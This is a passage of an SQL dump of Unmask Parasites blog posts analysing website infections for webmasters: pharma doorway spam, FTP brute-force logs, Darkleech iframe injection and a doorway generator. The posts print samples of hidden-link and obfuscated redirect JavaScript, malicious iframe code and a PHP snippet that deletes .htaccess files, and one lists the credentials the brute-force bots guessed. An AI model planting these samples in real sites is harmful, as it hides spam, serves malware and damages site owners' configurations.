2 out of the rest 5 specialized sites were promoted using hidden links on hacked sites. Not good. And the worst results (although ideal for testing my update) were for the [buy cialis] query — 100% of results on the first page (10 out of 10) led to doorways on hacked sites or simply spammy web pages. Not a single result from websites that really have anything to do with cialis.Results analysisHere is the breakdown of the first 10 results (links go to real time Unmask Parasites reports for these pages and at the moment of writing they all reveal spammy content. However this may change over time):www.epmonthly .com/advertise/ — doorway on a hacked sitewerenotsorry .com/ — strange spammy site with a rubbish content like this “The car buy cialis in your car is the ultimate well source of electrical amazing power in your car.“incose .org/dom/ — doorway on a hacked site.www.deercrash .org/buy/cialis/online/ — doorway on a hacked sitejon-odell .com/?p=54 — doorway on a hacked sitewww.goodgrief .org .au/Cialis/ — doorway on a hacked sitewww.asm .wisc .edu/buy-cialis — doorway on a hacked sitewww.mhfa .com .au/cms/finance-home/ — doorway on a hacked sitewww .plowtoplate .org/library/51.html — doorway on a hacked sitejohn-leung .com/?p=16 — doorway on a hacked siteOver the course of the past week the results slightly fluctuated and sometimes I saw the following links on the first SERP.www.enconline .com/buycialisonline/ — doorway on a hacked sitewww.bbs-usa .com/online/ — doorway on a hacked sitewww.fabrand .com/buycialis/ — doorway on a hacked sitewww.philiptusa .com/streak/ — doorway on a hacked sitewww.clarkart.edu/authman/ — doorway on a hacked sitewww.gvhc.org/temp/index.html — doorway on a hacked sitewww.cialis-no-prescriptions.com — specialized site, but its backlink profile include many hacked sites with injected hidden links (e.g. www.aauw-nys.org)tadalafilcheap .ca/buy-cialis-online – another specialized site with a very poor backlink profile (mostly spammy off-topic forum posts).Out of 18 links that I encountered on the first page for [buy cialis] 15 point to doorways on hacked sites, 1 to a site with unreadable machine-generated text (still not sure whether it’s some SEO experiment or a backdoor with a tricky search traffic processing procedure) and 2 specialized sites relevant to the query but with quite bad backlink profiles. Overall 0% of results that follow Google’s quality guidelines.So the Google’s update for spammy queries doesn’t seem to work as it should at least for some über spammy queries.  It’s sad. And the reason why I’m sad is not that I worry about people who use such queries on Google to buy some counterfeit drugs.  My major concern is this situation justifies the huge number of sites (many thousands) that cyber-criminals hack in order to put a few of their doorways to the top for relevant queries on Google.Behind the scenesThe above 15 hacked sites that I found on the first Google’s SERP are actually only a tip of the iceberg. Each of them is being linked to from many thousands (if not millions) pages from similarly hacked sites. Here you can see a sample list of  sites that link to the above 15 (you might need a specialized tool like Unmask Parasites to see hidden and cloaked links there).Many of the hacked web pages link to more than one doorway page, which maximizes changes that one of them will be finally chosen by Google to be displayed on the first page for one of the many targeted keywords. And at the same time this helps to have a pool of alternative doorways in case some of them will be removed by webmasters or penalized by Google. As a result, the networks of doorways, landing pages and link pages can be very massive. Here you can see a list with just a small part of spammy links (338 unique domains) that can be found  on hacked web pages..gov, .edu and .orgAmong those hacked sites you can find sites of many reputable organizations, which most likely greatly help to rank well on Google. There are many compromised sites of professional associations, universities and even governmental sites, for example (as of August 19th, 2013):www.volunteer.gov/sec/spb.ca.gov/status/www.takepride.gov/index.htmlVolume of spammy backlinksIf you take some of the top results and check their backlink profiles (I used Majestic SEO Site Explorer), you’ll see how many domains can be compromised (or spammed) just in one black hat SEO campaign. And we know that there are many ongoing competing campaigns just for “cialis” search traffic, so you can imaging the overall impact.On the above screenshot you can see that thousands of domains linking to “www .epmonthly .com/advertise/” using various “cialis” keywords.The situation with “www. epmonthly .com/advertise/” is quite interesting. If you google for [“www.epmonthly .com/advertise/”] you’ll see more than a million results pointing to web pages where spammers used automated tools to post spammy links (including this one) in comments, profiles , etc. but failed to verify whether those sites accept the HTML code they were posting (still many sites, while escaping the HTML code, automatically make all URLs clickable, so those spammers finally achive their goal) .Typical black hat SEO tricksIn addition to annoying but pretty harmless comment spamming, forum spamming and creating fake user profiles, black hats massively hack websites with established reputation and turn them into their SEO assets.Spammy linksThe most common use for a hacked site is injecting links pointing to promoted resources (it can be a final landing page, or a doorway, or an intermediary site with links). Here is what such web pages may look like in Unmask Parasites reports:To hide such links from site owners, hackers make them hidden. For example, they can place them in an off-screen <div><div style=\"position:absolute; left:-8745px;\">...spammy links here...</div>Or put them in a normal <div> and add a JavaScript to make this <div> invisible when a browser loads the page<div id=\'hideMe\'> ... spammy links here.... </div><script type=\'text/javascript\'>if(document.getElementById(\'hideMe\') != null){document.getElementById(\'hideMe\').style.visibility = \'hidden\';document.getElementById(\'hideMe\').style.display = \'none\';}</script>The JavaScript can be encrypted.e v a l(function(p,a,c,k,e,d){e=function(c){return(c<a?\"\":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!\'\'.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return\'\\\\w+\'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp(\'\\\\b\'+e(c)+\'\\\\b\',\'g\'),k[c]);return p;}(\'2.1(\\\'0\\\').5.4=\"3\";\',6,6,\'bestlinks|getElementById|document|none|display|style\'.split(\'|\'),0,{}))which translates todocument.getElementById(\'bestlinks\').style.display=\"none\";where “bestlinks” is the id of the <div> with spammy links.Sometimes, encrypted JavaScript can be coupled with dynamic HTML generation of the link container. After decryption it looks like this:document.w ri t e(\'<style><!-- .read {display:none} --></style><address class=\"read\">\');...spammy links here...document.wri te(\'</address>\');Of course, it’s only a client-side representation of the problem. On the server side, it’s rarely this straightforward. Most times it involves obfuscated (usually PHP) code in sneaky places (e.g. themes, plugins, DB, etc.)DoorwaysSites that rely on black hat SEO techniques get penalized by Google soon enough so the can’t expect much search traffic directly from search engines. Instead they try to promote many disposable doorways on other reputable sites that would redirect search traffic to them.The typical approach is to hack a website and use cloaking tricks (generating a specialized version with spammy keywords specifically for search engines while leaving the original content for normal visitors) to make search engines think that its pages are relevant for those spammy queries. E.g. check the title of the “www.epmonthly .com/advertise/” when you visit it in a browser (“Advertise“) and when you check it in Unmask Parasites or in Google’s Cache (“Buy Cialis (Tadalafil) Online – OVERNIGHT Shipping“). Then they add some functionality to distinguish visitors coming from search engines and redirect them to third party sites that pay hackers for such traffic.The redirects may be implemented as .htaccess rules, client-side JavaScript code, or server-side PHP code.Sometimes, instead of using cloaking, hackers simply create a whole spammy section in a subdirectory of a legitimate site, or a standalone doorway page. Example from our cialis search results: www .asm .wisc .edu/buy-cialis .To WebmastersIt might be tricky to determine whether your site fell victim to a black hat SEO hack since hackers do their best to hide evidence from site owners and regular visitors. At the same time antivirus tools won’t help you here since links and redirects (in case they can actually see them) are not considered harmful. Nonetheless, a thoughtful webmaster is always equipped with proper tools and tricks (click here for details) to determine such issues.  They range from specialized Google search queries and and reports in Webmaster Tools to log analysis and server-side integrity control.In addition to the tricks that I described here, you can try to simply load your site with JavaScript turned off. Sometimes this is all it takes to find hidden links whose visibility is controlled by a script.Fighting black hat SEO hacksOf course, site owners are responsible for what happens with their sites, should protect them and clean them up in case of hacks. Doorways on hacked sites would never appear in search results if all webmasters would quickly mitigate such issues.But let’s take a look at this from a different perspective. The main goal of all black hat SEO hacks is to put their doorways to the top on Google for relevant keywords and get a targeted search traffic. And 80% (or even more) massive campaigns target a very narrow set of keywords and their modification. If Google actively monitor the first pages of search results for such keywords and penalize doorways, this could significantly reduce efficacy of such campaigns leaving very few incentive to hack website to put spammy links there. And you don’t have to monitor every possible keyword combination. In my experience, most of them will finally point to the same doorways.I can see Google moving in this direction. The description of the above mentioned ranking algorithm update is very promising. However, as the [buy cialis] query with 0% of relevant search results on the first page shows — a lot should be improved.P.S  Just before posting this article, I checked results for [buy cialis] once more and … surprise!.. found a link to a Wikipedia article about Tadalafil at the 4th position. Wow! Now we have 1 result that doesn’t seem to have anything to do with hacked sites.Related postsCloaking: Think Outside of [Your] BoxCareless Webmasters as WordPress Hosting Providers for Spammers“Cheap Vista” or Cloaked Spam on High-Profile SitesMatt Cutts on MalwareIntroduction to Website Parasites                                                                                  Tags: black hat seo cialis cloaking doorway google hidden links spam                                                    			                                            « FTP Brute Force Attacks?                Unmask Parasites joins Sucuri »            			    Reader\'s Comments (2)       	        			        			Colin | 29 Aug 2013 9:27 am 						Hi Dennis,Great analysis, very intersting.I actually contacted the support team at Volunteer.gov a couple of weeks ago, and they were able to remove the hacked pages they were hosted, as well as the other .govs. Great result, was happy at that :)They were hosting a pharma online store, which on investigation was apparently set up to facilitate credit card fraud.Cheers                   			        			Denis | 29 Aug 2013 4:28 pm 						Good!-1 spammy doorway on .gov.Hope Google will also take care of what it returns for certain spammy queries.', '', 'http://blog.unmaskparasites.com/2013/08/21/analyzing-buy-cialis-search-results/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (210, 'FTP Brute Force Attacks?', 'unmask', '26 Jun 13', 'Loading site search ...          			                FTP Brute Force Attacks?                          26 Jun 13   Filed in Website exploits                Hacking websites using FTP access has been one of the most popular attack vectors during the last few year. I can still see many massive site infections done via FTP.In most cases, the first step of such attacks is stealing FTP credentials from local computers of webmasters. Back in 2009, I described how PC malware stole passwords saved in popular FTP clients such as FileZilla, CuteFTP, SmartFTP and many more. This is still a prevailing vector. More exotic password theft methods include keyloggers, FTP traffic sniffing, and stealing user databases of hosting providers who prefer convenience over security and store actual client passwords in plain text or slightly encrypted (instead of storing only hashes of passwords).If you ask regular webmasters how hackers can break into their server via FTP, many of them will answer that hackers could guess the password (hence the need to have hard-to-guess passwords).  Of course, it is hard to guess whatever password at the first attempt, so one might expect to see multiple such attempts (so-called brute force attacks) before a password is cracked and hackers get access to a server. However in real life, I haven’t come across such FTP brute force attacks. Until this month…FTP log analysisI helped a webmaster of a hacked site and, as always, requested recent access and FTP logs to figure out how the site was hacked. The FTP logs clearly showed that someone used a valid username and passwords to upload infected files to the server. This happened several times a day (constant reinfections) from different IPs in different countries. Quite a typical picture.What was untypical were requests that looked like a brute force attack. They came from different IPs and each IP tried to login using many invalid usernames.Choice of usernames in brute force attacks.Here are just a few such sessions and the usernames they tried.198.50.144.128 (Canada		        Montreal		        Ovh Hosting Inc) – 165 login attempts within 70 seconds.second_level_domainsecond_level_domawebmasterwhere <second_level_domain> should be replaced with a real second level domain of a site. E.g. in case of “example.com” the second_level_domain will be example.This attack used the <domain name> as a username and webmaster as an alternative (supposedly default) username, and tried multiple popular passwords from some dictionary.46.29.255.84 (United States		        Lombard		        Deepak Mehta Fie) 	– 9 login attempts at a rate of 2 a second:second_level_domainsecond_level_domainsecond_level_domainsecond_level_domainftpsecond_level_domainrootsecond_level_domainadminsecond_level_domainuserIn this case, the attacker used domain name derivatives (appending words like ftp, admin, user) as usernames,  and the passwords probably matched the usernames (e.g. exampleftp/exampleftp).  A few times they re-tried the same usernames. Probably with slightly different passwords.110.85.113.113,  110.86.165.187, 117.26.118.189, 117.26.119.68 (all from China		        Fuzhou		        Chinanet Fujian Province Network) — 76 login attempts in less than 5 minutes from 4 IPs.00000011111111223312312332112345612345678123456789123654123abc1472581473692222223211233333334444445201314521521555555666666777777888888987654321999999abc123adminadmin111admin123admin222admin321admin333admin444admin555admin666admin777admin888admin999asd123asdasdsecond_level_domainsecond_level_domaintop_level_domaindata123qwe123qwertytestwebweb123wwwwww123zxc123zxcvbnDistributed attackThe last one was obviously a distributed brute force attack where bots from 4 different IPs worked simultaneously and in sync. E.g. one checked “111111” then another checked “112233“, then third checked “222222” and “333333“, then fourth checked “444444“, and so on. Most likely this attack also assumed that some sites may use the same words both as a username and a password.The above three attack took place within 26 hours. Each of them used different approach to choosing usernames and passwords, and they came from different parts of the Internet. It means that there is a real interest in FTP brute force attacks among cyber criminals.Why didn’t I come across such attacks before?After all, brute-force attacks on WordPress and Joomla admin interfaces proved to be very efficient. What makes them so efficient is the fact that there are many millions of WP and Joomla sites out there, and out of those millions there will always be enough sites whose admins were thoughtless enough to choose weak passwords.  That’s why I see hundreds or even thousands of login attempts per day in access logs of almost every WordPress and Joomla site I work with. And unfortunately, some of those site were hacked as a results of the brute force attacks.One might think that FTP is an even better target for brute force attacks since almost every site has FTP access so the number of victims with weak FTP passwords should be substantially larger than the number of WP an Joomla sites with crackable passwords. However it’s not that easy. You should not forget than in case of WP and Joomla, hackers assume that site administrators use the CMS default usernames (admin for WP and administrator for Joomla) so they only need to guess their passwords. But in case of FTP, the username is not known. There is no default FTP username. This is especially true for shared hosting environments where every client must use a unique username. So you need to guess both username and password in order to get access to a site, which dramatically reduces efficiency of brute force attacks (don’t forget the network latency of each FTP request which prevents from testing millions of variants per seconds that one might expect in a latency-free environment).In order to try the brute force approach, hackers need to narrow down their attack to the simplest cases and hope that the Internet is so big that even a tiny fraction of sites with hackable FTP credentials will worth the effort. And the Internet is really big (there are more than 100,000,000 .com domains alone) and to have better results one needs to attacks as many of them as possible, so the set of username/password pairs should be kept as tight as possible to provide results in reasonable time. Based on the above FTP log analysis, the current approach is to target: sites that use their domain name or some easy derivative from a domain name as a username along with a weak password. sites that use the same simple words for both usernames and passwords.Another reason why FTP brute-force attacks are not popular is the FTP logins can be tracked by server administrators who can, for example limit number of consecutive failed login attempts per IP address and then block the offending IPs (for example, using the fail2ban tool).I also guess that many server and client bots might simply lack the FTP brute force functionality…Do you have any better explanation?Why did I see the FTP brute force attacks on that particular site?I have two hypothesis:1. Massive FTP brute force attacks are in the proof of concept stage. A few years ago WordPress brute force attacks were quite rare too, but once criminals figured out that they could be very successful if you had enough resources to attack a large number of site, such attacks went mainstream. So maybe if FTP brute force attacks eventually prove to deliver good results, we’ll see a flood of login attempts in FTP logs of most sites (I hope not).2. In the beginning of the post, I forgot to mention about one more failed login attempt. It used the “anonymous” username and the 66.249.72.181 IP address. The thing is the IP address belongs to Google, more specifically to Googlebot. This means that there are some FTP links (e.g. ftp://example.com ) to that site on the web and Googlebot tries to crawl them using the default anonymous username which normally doesn’t require a password and is used for public FTP sites. Here is the explanation from John Mueller (Webmaster Trends Analyst at Google):When we find links to FTP content, we’ll generally attempt to crawl  those URLs. If they’re publicly accessible and return normal content, we  may choose to index them as well. While it’s not that common, there are  occasionally queries where a file on an FTP server is a good result.So my guess is such attacks may be limited to the sites that have direct FTP links to them on the web.Do you have any better explanation?Just in case. No, the original successful FTP hack that I investigated was not a result of a brute force attack. The username was not obvious and the  password was strong. The attackers used the tried-and-true credential  theft approach.To webmastersRegardless of the chances to see massive FTP brute force attacks in future, the described example should be considered as yet another lesson to all webmasters, who should realize all risks associated with FTP.Carefully choose both username and password.They should not be the sameThe username shoudn’t be easy to guess (e.g.  your site domain name is not the best choice)The password should be strong.Don’t save passwords in FTP programs. Configure them so that they ask for a password every time you connect to your site. If you work with multiple sites and/or don’t like the idea of memorizing many passwords, consider using password managers like KeePass or LastPass — they save your passwords much more securely.Consider using SFTP instead of FTP that sends your passwords in plain  text (they can be easily intercepted, for example, when you use public Wi-Fi). Most popular FTP  programs support SFTP, so the switch should be painless. If you  manage your own server, consider not installing an FTP server  altogether (or uninstalling it now if there are no others users who can’t use SFTP).If you manage a server, consider blocking multiple consecutive failed login attempts at a firewall level (tools like fail2ban may help). Moving FTP to a custom port may also help.Minimize risks of infecting your local computer (which brings you a step closer to password theft). Make sure that all software on your computer is up-to-date. This includes all OS  security updates, all browser updates and all browser plugin updates. Here you can check whether your browser is vulnerable:https://browsercheck.qualys.com/http://www.mozilla.org/en-US/plugincheck/Related posts:10 FTP Clients Malware Steals Credentials FromBeware: FileZilla Doesn’t Protect Your PasswordsWeak Passwords and Tainted WordPress WidgetsIntroduction to Website Parasites﻿                                                                                  Tags: brute-force FTP log analysis                                                    			                                            « Rotating Iframe URLs – One a Minute                Analyzing [Buy Cialis] Search Results »            								Comments are closed.', '', 'http://blog.unmaskparasites.com/2013/06/26/ftp-brute-force-attacks/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (211, '“Fancybox for WordPress Has Expired” Infection', 'unmask', '01 Apr 15', 'Loading site search ...          			                “Fancybox for WordPress Has Expired” Infection                          01 Apr 15   Filed in General, Short Attack Reviews, Website exploits                Today I began to notice quite a massive and very unusual attack that leverages vulnerabilities in older versions of the FancyBox for WordPress plugin.As you might know, versions 3.0.2 and older of this plugin allowed anyone to craft special POST requests to /wp-admin/admin-post.php or /wp-admin/admin-ajax.php and change values of specific plugin options in WordPress database. The plugin uses the modified options to build its own JavaScript code. As a result, the malicious content gets injected into generated WordPress pages.A typical malicious injection looks like this:Such attacks use the documented exploit code to inject malicious code into the “padding” value.The exploited vulnerability had been fixed on February 4th. Nonetheless, many blogs failed to update the plugin and hackers routinely find such blogs and infect them.The today’s attack also uses this exploit and modifies the “padding” value, but the code it injects cannot be called malicious:When visitors load such “infected” pages, they see this warning:WARNING: This version of the Fancybox for WordPress plugin has expired! Please upgrade to the latest version!And when they click on the “OK” button, they automatically get redirected to the Fancybox for WordPress changelog page in the official WordPress plugin repository.On one hand, this infection makes blogs unusable since it redirects visitors to WordPress plugin repository before they can read anything. On the other hand, it is very hard to ignore such a warning — if site owners want people to visit their sites they have to upgrade (or remove) the vulnerable version of the plugin ASAP.Now is the time to check if your blog shows such warnings. If you don’t see them, it’s not a reason to relax and wait for such a hard push to upgrade. Make sure all your themes and plugins are up-to-date now.                                                                                   Tags: April1 Fancybox WordPress                                                    			                                            « Darkleech Update – November 2014                            			    Reader\'s Comments (%)       	        			        			Pascal | 02 Apr 2015 8:43 am 						I’m a little suspicious because this article is tagged with “April1″ – though I don’t really see the sense in making this a hoax?', '', 'http://blog.unmaskparasites.com/2015/04/01/fancybox-for-wordpress-has-expired-infection/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (212, 'Darkleech Update – November 2014', 'unmask', '27 Nov 14', 'Loading site search ...          			                Darkleech Update – November 2014                          27 Nov 14   Filed in Short Attack Reviews, Website exploits                Just wanted to document some latest changes in Darkleech behavior that may help you detect it.I’d like to thank internet security enthusiasts who share their findings with me. Without you, I could have easily missed these new (?) details.Quick recapDarkleech is a root level server infection that installs malicious Apache modules. The modules inject invisible iframes into server response when it is already prepared (linebreaks added for readability).<style>.a4on6mz5h { position:absolute; left:-1376px; top:-1819px} </style> <div class=\"a4on6mz5h\"><ifr ame src=\"hxxp://tfmjst .hopto .org/nsiumkogckv1tv4locfzyv2eykqss9ltfb9wnmhfqz1ol2\" width=\"247\" height=\"557\"></ifram e></div>All the elements of this code are random and auto-generated on the fly (style name, coordinates, iframe diminsions, URL paths). Moreover, the iframe domains change every few minutes — lately hackers prefer free No-IP.com dynamic DNS hostnames like hopto.org, ddns.net, myftp.biz, myftp.org, serveftp.com, servepics.com, etc.This infection is hard to detect as it only shows up once per IP per day (or maybe even more seldom). And since it works on a low system level, it can detect if server admins are logged in, so it lurks until they log out — this means that they won’t see anything even if they monitor outgoing TCP traffic.For more details, please check the links at the bottom of this post.What’s new?IE=EmulateIE9Recently, I’ve been pointed at the fact that now Darkleech also adds the following meta tag setting IE 9 compatibility mode in Internet Explorer. It looks like it searches for the </head> tag and replaces it with the following code (again, linebreaks added for readability):<meta http-equiv=\'x-ua-compatible\' content=\'IE=EmulateIE9\'></head><style>.syxq9la69 { position:absolute; left:-1666px; top:-1634px} </style> <div class=\"syxq9la69\"><iframe src=\"hxxp://jsnrgo .ddns .net/nsiumkogckv1tv4locfzyv2eykqss9ltfb9wnmhfqz1ol2\" width=\"285\" height=\"554\"></iframe></div>This IE=EmulateIE9 instruction tells modern versions of Internet Explorer to render a web page as if they were IE 9, using all the features that has been deprecated in IE 10 and newer versions of IE. Some of the legacy features are known to have vulnerabilities and hackers try to exploit them turning the compatibility mode on (e.g. VML-related exploit)_SESSION_ID cookieIn addition to temporary IP blacklisting, Darkleech also uses the _SESSION_ID cookie that expires in one week. It adds the following cookie into response headers:Set-Cookie: _SESSION_ID=-1; expires=Wed 03-Dec-2014 09:32:48 GMT; path=/So even if you change your IP address (e.g. if you have a dynamic IP address) you still won’t see malware for the following 7 days. So don’t forget to clear/block cookies if you are trying to reproduce infected response.Most likely the IP blacklisting also works for one week now too.Just a couple of more things:As you might have figured out, it looks for Internet Explorer User-Agent (and derivatives like Maxthon, Avant).Referer is not important at the moment. I managed to trigger it even without the Referer header.That’s it for today. Please let me know if you have some other news about Darkleech.Previous posts about Darkleech:Malicious Apache Module Injects IframesRFI: Server-wide iframe injectionsWorking With the Darkleech Bitly DataDarkleech + Bitly.com = Insightful Statistics (Sucuri blog)Server Compromises – Understanding Apache Module iFrame Injections and Secure Shell Backdoor (Sucuri blog)                                                                                   Tags: Apache Darkleech EmulateIE9 No-IP                                                    			                                            « Most Contradictive Doorway Generator                “Fancybox for WordPress Has Expired” Infection »            			    Reader\'s Comments (2)       	        			        			WordPress Malware Causes Psuedo-Darkleech Infection | Sucuri Blog | 26 Mar 2015 4:25 pm 						[…] and this is the code from November of 2014 […]                   			        			WordPress Malware Causas Psuedo-Darkleech Infección | Sucuri Español | 13 Apr 2015 10:41 pm 						[…] y este es el código de noviembre de 2014: […]', '', 'http://blog.unmaskparasites.com/2014/11/27/darkleech-update-november-2014/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (213, 'Most Contradictive Doorway Generator', 'unmask', '12 Sep 14', 'Loading site search ...          			                Most Contradictive Doorway Generator                          12 Sep 14   Filed in Short Attack Reviews                Check this thread on WordPress.org forum. The topic starter found a suspicious PHP file and asked what it was doing.The code analysis shows that it’s some sort of a spammy doorway. But it’s a very strange doorway and the way that it works doesn’t make sense to me.First of all, this script has a random text and code generator. The output it generates is [kind of] always unique. Here is a couple of output pages:http://pastebin.com/ymwMZMWPhttp://pastebin.com/Y6B7WM2T...<title>Is. Last spots brows: Dwelling. Immediately moral.</title></head><body>listend40721<span>Flowerill merry chimes - has: Her - again spirits they, wooers. Delight preserve. For he. Free - snow set - grave lapped, icecold made myself visitings allow, beeves twas. Now one:...We usually see such a random text, when spammers want search engines to index “unique” content with “right” keywords. But…1. the script returns the page with the 404 not found code.header(\"HTTP/1.1 404 Not Found\");so the page won’t be indexed by search engines.2. The obfuscated JavaScript code at the bottom of the generated page redirects to a pharma site after about a second.function falselye() { falselya=29; falselyb=[148,134,139,129,140,148,75,145,140,141,75,137,140,128,126,145,134,140,139,75,133,143,130,131,90,68,133,145,145,141,87,76,76,145,126,127,137,130,145,138,130,129,134,128,126,143,130,144,75,130,146,68,88];falselyc=\"\"; for(falselyd=0;falselyd<falselyb.length;falselyd++) { falselyc+=String.fromCharCode(falselyb[falselyd]-falselya); } return falselyc; } setTim eout(falselye(),1263);decodedwindow.top.location.href=\'hxxp://tabletmedicares .eu\';Update: on another site the script redirected to hxxp://uanlwkis .com (also pharma site), which was registered only a few days ago on Sept 6th, 2014.But the generated text has no pharma keywords. One more hint that it’s not for search engines. Maybe it’s an intermediary landing page of some email spam campaign that just needs to redirect visitors? I saw many such landing pages on hacked sites. But it most cases they looked like the decoded version of the script — just a redirection code. Indeed why bother with sophisticated random page generator if no one (neither humans nor robots) is going to read it?3. There is also this strange piece of code:$s=\'/\';if (strtolower(substr(PHP_OS,0,3))==\'win\') $s=\"\\\\\\\\\";$d=array(\".$s\");$p=\"\";for($i=1; $i<255; $i++){$p.=\"..$s\";if (is_dir($p)){array_push($d,$p);}else{break;}}foreach($d as $p){$a=\"h\".\"tac\".\"c\".\"es\".\"s\";$a1=$p.\".$a\";$a2=$p.$a;$a3=$p.\"$a.txt\";@chmod($a1,0666);@unlink($a1);@chmod($a2,0666);@unlink($a2);@chmod($a3,0666);@unlink($a3);}What it does it tries to find an delete(!) all file with names .htaccess, htaccess and htaccess.txt in the current directory and all(!) the directories above the current.That just doesn’t make sense. Why is it trying to corrupt websites? I would understand if it only removed its own files and injected code in legitimate files, but it tries to just remove every .htaccess (and its typical backups) without checking what’s inside. That’s a really disruptive and annoying behavior given that many sites rely on the settings in .htaccess (e.g. most WordPress and Joomla sites).It’s indeed a most contradictive doorway generator that I ever seen. I can’t find any good explanation why it does things the way it does. Maybe you have any ideas?Related posts:Analyzing [Buy Cialis] Search ResultsRich Snippets in Black Hat SEOCareless Webmasters as WordPress Hosting Providers for SpammersHtaccess Redirect to Example.ru/dir/index.phpIntroduction to Website Parasites                                                                                  Tags: doorway htaccess redirect                                                    			                                            « Google -> Doorway -> Google -> Spam                Darkleech Update – November 2014 »            								Comments are closed.', '', 'http://blog.unmaskparasites.com/2014/09/12/most-contradictive-doorway-generator/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (214, 'Google -> Doorway -> Google -> Spam', 'unmask', '11 Jun 14', 'Loading site search ...          			                Google -> Doorway -> Google -> Spam                          11 Jun 14   Filed in Uncategorized                Just a few thoughts about an interesting behavior of a black-hat SEO doorway.Typically hackers create doorways on compromised sites to make search engines rank them for certain keywords and then, when searchers click on the links in search results, those doorways redirect them further to a site that hackers really promote. Sometime that redirect may go through some TDS (traffic directing service) but the whole scheme remains pretty much the same:Search results -> doorway -> beneficiary siteToday, when doing a backlink research of one of such pharma doorways, I encountered a different scheme — a one with a loop.The doorway had this URL structure:http://www.hacked-site.com/blog/?prednisolone-without-prescriptionWhen I checked it in Unmask Parasites or in Google cache, I saw spammy content with links to doorways on other hacked sites. Quite typical.When I opened that page in a web browser, it redirected to a TDShxxp://bh2r3gof .biz/sutra/in.cgi?5&from=90dc16aaf3e24ea68c94c3f784a37ff9&gdw=w-48&gdf=%2F90dc16aaf3e24ea68c94c3f784a37ff9-f08f149982bf04ffaa308aba00b2d569.txt&host=www.hacked-site.com&kw=prednisolone%20without%20prescription&HTTP_REFERER=https%3A%2F%2Fwww.google.com%2F%3Fsource%3Dnoref%26q%3Dprednisolone%2520without%2520prescriptionCloaking and conditional redirects to traffic directing services are also quite typical for doorways.Then TDS made another hop:hxxp://bh2r3gof .biz/sutra/in.cgi?5&from=90dc16aaf3e24ea68c94c3f784a37ff9&seoref=8bB06MP5xFTR3TkqmNILbbW5mW30f%2B%2FMiQdbatwxiv5CUUTkQjEO75VtTs7IRqdVTmPfmX……..2FIXHlBdqV6iDd1ruYQMhqmYVCozdkTrAN76fOABiczAnd then I ended up on … Google:http://www.google.com/search?q=prednisolone+without+prescriptionAnd that is not very typical. But interesting.One one hand, it looks like the spammers didn’t consider me as a target traffic (probably because of my IP) and redirected back to the Google search results page for the same query that I supposed to be using when found that site. For some, this chain of redirects may look as if they clicked on a search result and then Google thought for some time and reloaded the same page, which may look like just a glitch.On the other hand, it looks like a second level of search engine optimization, when spammers fine tune a search query that may return better doorways. I can’t help thinking about this because when I see the search results on Google pages that the TDS redirects me to, I realize that most of them are doorways on hacked sites (yes, including those with fake stars in ratings).I know, it’s quite pointless. Why redirect people who already clicked on your doorway to a new set of search results? Although those results may contain some of your other doorways, there is no guarantee that the searcher will not go away or click on them and not on links of your competitors? And you can’t control Google search results — it may happen that there will be no your doorways on the results page.OK. Let’s try to think as the TDS owners. The TDS recognizes the traffic that it doesn’t need for the pharma campaign. It mayredirect it to pharma landing pages anyway (which may decrease the quality and the price of such a traffic)dispose of that traffic altogether (redirect it to a neutral third-party site, like Google)try to monetize that traffic anyway — redirect it to some scam site, porn site, malware site or any other resource that knows how to take advantage of low quality traffic.<warning:unfounded speculation>But what it the spammers also run another campaign that targets the traffic that doesn’t fit their pharma campaign? They can simply redirect the traffic to landing pages of the second campaign. But such traffic will not be targeted. People searched for different things. So maybe it is worth it to “re-target” the traffic and redirect the searchers to a Google result page for keywords relevant to that second campaign and that contains links to their doorways.Here’s the scenario:People search something on Google and click on some result. For some reason Google reloads the page and shows them completely different results for a different query. Some searchers will definitely leave (don’t worry, this was unwanted traffic anyway) but some may become interested in what Google offers them and click on results (after all spammers usually promote something that people need and if it comes from Google it looks more legit). So, instead of either lost or untargeted traffic, they get targeted traffic of people who willingly clicked on search results. All they need to do is make sure their doorways dominate for relevant search queries (shouldn’t be hard since the TDS provide the search query itself and there is no need to rank for short generic queries.)</warning:unfounded speculation>OK, enough speculations. That particular campaign was not using the second level Google optimization. It simply dumped unneeded traffic back to Google. When opening the same doorways from different country IPs, the TDS redirected me to a random “Canadian Pharmacy” site from its pool of about a dozen of sites.Anyway, the point of this post is despite of Matt Cutts’ recent announcement of rolling out the second ranking update for “very spammy queries” I still see that 50% or more of top search results for pharma keywords still point to doorways on hacked sites.This past weekend we started rolling out a ranking update for very spammy queries: http://t.co/NpUZRqpnBI— Matt Cutts (@mattcutts) May 21, 2014And as long as “very spammy queries” return “very spammy results”, there will be incentive for black hat SEOs to hack sites and create doorways there.Related posts:Analyzing [Buy Cialis] Search ResultsRich Snippets in Black Hat SEOCareless Webmasters as WordPress Hosting Providers for Spammers“Cheap Vista” or Cloaked Spam on High-Profile SitesIntroduction to Website Parasites                                                                                  Tags: black hat seo doorway TDS                                                    			                                            « Working With the Darkleech Bitly Data                Most Contradictive Doorway Generator »            			    Reader\'s Comments (2)       	        			        			SearchCap: Google PayDay Loan 3.0, Bing Ads URL Tagging & World Cup Fever | 12 Jun 2014 9:14 pm 						[…] Google -> Doorway -> Google -> Spam, Unmask Parasites. Blog. […]                   			        			Rosanne & Jerry Shalf | 03 Dec 2014 6:27 pm 						I keep getting redirected to a Canadian drugstore site when I type in ashlandmuseum.org. Before the Canadian drugstore site pops up I see something that looks like tds….etc. but it quickly moves to the Canadian site, so I don’t know the complete set of letters.  I have a macbook pro 2012 and am using Maverick 10.9.5 OS.  It doesn’t always happen, which is weird, and it only happens on my computer, not others.  It happens when I use Firefox and Safari.  How do I get rid of it?  I had Applecare go through the machine and we got rid of various viruses, but we couldn’t fix this one.  Applecare said it was because of something Google did and only Google can fix, but I can’t figure out how to reach Google and ask for help.  Please, somebody, help me!!', '', 'http://blog.unmaskparasites.com/2014/06/11/google-doorway-google-spam/\n');
